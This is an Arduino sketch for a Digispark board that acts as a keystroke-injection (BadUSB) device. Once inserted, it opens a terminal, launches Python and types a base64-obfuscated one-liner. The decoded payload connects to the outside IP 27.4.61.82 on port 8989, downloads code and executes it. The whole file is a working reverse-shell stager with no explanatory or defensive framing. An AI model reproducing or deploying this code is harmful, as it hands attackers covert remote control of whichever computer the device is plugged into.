#include "DigiKeyboard.h"
void setup() {
  pinMode(1,OUTPUT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T,MOD_CONTROL_LEFT|MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("python");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcyNy40LjYxLjgyJyw4OTg5KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("quit()");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1,HIGH);
  delay(500);
  digitalWrite(1,LOW);
}


void loop() {
  //digitalWrite(1,HIGH);
  //delay(500);
  //digitalWrite(1,LOW);
  //delay(500);

//DigiKeyboard.println("hey hacked");
//DigiKeyboard.delay(2000);


}
